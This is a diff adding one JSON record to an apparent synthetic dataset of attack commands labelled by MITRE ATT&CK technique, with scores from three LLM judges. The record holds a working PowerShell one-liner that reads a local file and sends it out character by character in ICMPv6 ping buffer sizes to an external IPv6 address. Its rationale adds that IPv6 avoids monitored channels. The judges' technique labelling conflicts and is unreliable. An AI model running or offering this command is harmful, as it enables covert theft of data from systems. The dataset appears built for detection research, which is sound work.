@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:0:be:ef::42'; $lines=Get-Content 'C:\\Users\\Public\\message.txt'; foreach($line in $lines){ Test-Connection -ComputerName $d -Count 1 -BufferSize 900 -IPv6 -Quiet | Out-Null; $line.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (900 + [byte][char]$_) -IPv6 -Quiet | Out-Null } }",
+  "explanation": "Frames text exfiltration over ICMPv6 by sending a start-of-line marker payload size followed by per-character payload sizes, using ICMPv6 as the alternate medium per T1011.",
+  "rationale_steps": [
+    "Iterate lines, emitting a fixed-size sync marker for each line.",
+    "Encode each character into the ICMP payload size with a known base.",
+    "Use IPv6 addressing to avoid commonly monitored IPv4 channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-2dc0b3c8",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced quotes/parentheses/braces, appropriate pipeline operators, and valid cmdlet parameters.",
+        "semantic_score": 2,
+        "semantic_justification": "The command implements data exfiltration over ICMPv6 which is misaligned with T1011 (Search Closed Sources) as it's actually implementing T1048 (Exfiltration Over Alternative Protocol) using ICMP echo requests.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T12:02:18.888322Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, uses valid cmdlets, arguments, control flow, and variable assignments, with no syntax errors or parsing issues.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs text exfiltration over ICMPv6, which is an exfiltration technique (e.g., T1048.003), but it has no semantic alignment with MITRE ATT&CK T1011 'Search Closed Sources', which involves acquiring external intelligence from non-public sources.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T12:02:29.336229Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes/braces, valid Test-Connection parameters for Windows (-ComputerName, -Count, -BufferSize, -IPv6, -Quiet), and proper separators.",
+        "semantic_score": 1,
+        "semantic_justification": "The command implements ICMPv6-based exfiltration via payload sizing, which does not align with the described T1011 'Search Closed Sources' reconnaissance activity.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T12:03:02.537496Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
